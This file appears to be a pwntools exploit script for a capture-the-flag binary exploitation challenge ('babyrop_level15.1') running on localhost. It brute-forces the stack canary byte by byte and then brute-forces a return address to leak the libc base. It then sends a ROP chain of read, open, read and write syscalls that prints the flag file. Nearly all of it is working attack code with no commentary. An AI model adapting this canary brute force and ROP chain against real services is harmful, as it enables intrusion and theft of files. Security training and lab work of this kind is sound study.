from pwn import *
import time 

offset = 0x48
# change this 
s = ''' 
b * challenge+108 
'''
binary = './babyrop_level15.1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')


context.binary = binary
#p = remote('localhost', 1337)


#gdb.attach(p, s)

# 0xebc15024f35e0100 


# output might be different
# might not have Goodbye
canary = b'\x00'

'''
p = remote('localhost', 1337)
gdb.attach(p, s)

payload = flat(
	b'A'* offset,
	canary + b'\xcc'
)
p.send(payload)
p.interactive()
'''
def kill_latest_port_1337():
    try:
        # Get processes using babyrop_level15
        cmd = "ps aux | grep 'babyrop_level15' | grep -v grep | awk '{print $2}'"
        output = subprocess.check_output(cmd, shell=True).decode().strip()
        
        if output:
            # Split into list of PIDs
            pids = output.split('\n')
            
            if len(pids) > 1:
                # Get the most recent PID (last in the list)
                latest_pid = pids[-1]
                
                # Kill the process
                kill_cmd = f"kill -9 {latest_pid}"
                subprocess.call(kill_cmd, shell=True)
                print(f"✓ Successfully killed latest babyrop process (PID: {latest_pid})")
            else:
                print("Only one process found, keeping it alive.")
        else:
            print("No babyrop processes found.")
            
    except Exception as e:
        print(f"Error: {e}")
        
        
        
        
        
        
        
        
        
        
        

for i in range(7):
	for new_byte in range(0xff + 1):
		p = remote('localhost', 1337)
		
		
		#gdb.attach(p, s)
		payload = flat(
			b'A'* offset,
			canary + p8(new_byte)
		)
		

		try:
			p.send(payload)
			response = p.recvuntil(b"*** stack smashing detected ***", timeout = 1)
			print(response)
			if b"*** stack smashing detected ***" in response:
				print("failed")
			
			p.close()

		except EOFError:

			print("Success! byte = ", hex(new_byte))
			canary += p8(new_byte)
			break
			p.close()
		
print("Successfully brute-forced the canary, it is: ", canary.hex())

'''
p = remote('localhost', 1337)
gdb.attach(p, s)

payload = flat(
	b'A'* offset,
	canary,
	b'B' * 8,
	p64(0xdeadbeef)
)
p.send(payload)
p.interactive()


# 0x560a1434d350

# 00101320


'''
'''
for rip in range(0xff + 1):
	p = remote('localhost', 1337)


	payload = flat(
		b'A'* offset,
		canary,
		b'B' * 8,
		p8(rip)
	)
	try:
		#gdb.attach(p, s)
		p.send(payload)
		#p.interactive()
		response = p.recvuntil("Goodbye!\nThis challenge", timeout = 1)
		kill_latest_port_1337()
		print(response)
		print("Success! byte = ", hex(rip))
		
		p.close()
		break
		
	except:
		print("failed")
		p.close()


p.interactive()

'''













        
        
        
        
        
        

rip = b'\x0e'



for i in range(5):
	for new_byte in range(0xff + 1):
		
		p = remote('localhost', 1337)
		
		
		payload = flat(
			b'A'* offset,
			canary,
			b'B' * 8,
			rip + p8(new_byte)
		)

		try:
			p.send(payload)
			response = p.recvuntil("###\n### Welcome to", timeout = 0.1)
			kill_latest_port_1337()
			print(response)
			if b"###\n### Welcome to" in response: # starting text of the program, but also creates a new connection port here
				print("Success! byte = ", hex(new_byte))
				rip += p8(new_byte)
				#kill_extra_connections()
				p.close()
				#time.sleep(0.1)
			break 
			
		except EOFError:
			print("failed")
			p.close()
		
		#time.sleep(0.5)
			


rip = int.from_bytes(rip, 'little')
libc_base = rip - 0x2400e
writable_space_base = rip + 0x1c9ff2
print("Successfully brute-forced a libc address leak, it is: ", hex(libc_base))


# gadgets


#print(hex(leak))
#print(hex(libc_base))






#essential address 
#f_string_addr = libc_base + next(libc.search(b'f\0'))
flag_addr = writable_space_base + 100
f_string_addr = writable_space_base + 150
#gadgets again 


#gadgets:

pop_rdi = libc_base + 0x0000000000023b6a
pop_rax = libc_base + 0x0000000000036174
pop_rsi = libc_base + 0x000000000002601f
pop_rdx_pop_r12_ret = libc_base + 0x0000000000119431
syscall = libc_base + 0x00000000000630a9
leave_ret = libc_base + 0x0578c8
'''

pop_rdi = libc_base + 0x2a205
pop_rax = libc_base + 0x43067
pop_rsi = libc_base + 0x2bb39
pop_rdx = libc_base + 0x10d37d
syscall = libc_base + 0x8ed72
'''






p = remote('localhost', 1337)
gdb.attach(p, s)

payload = flat(
	# read
	b'A'*offset,
	canary,
	b'B'*8, # old rbp
	
	
	# read 
	pop_rdi,
	0, # fd
	pop_rsi,
	f_string_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	
	# open
	pop_rdi,
	f_string_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read 
	pop_rdi,
	3,
	pop_rsi,
	flag_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	1,
	pop_rsi,
	flag_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	1,
	syscall
	
	
)
p.send(payload)
time.sleep(5)
p.clean()
p.send('./flag')

p.interactive()
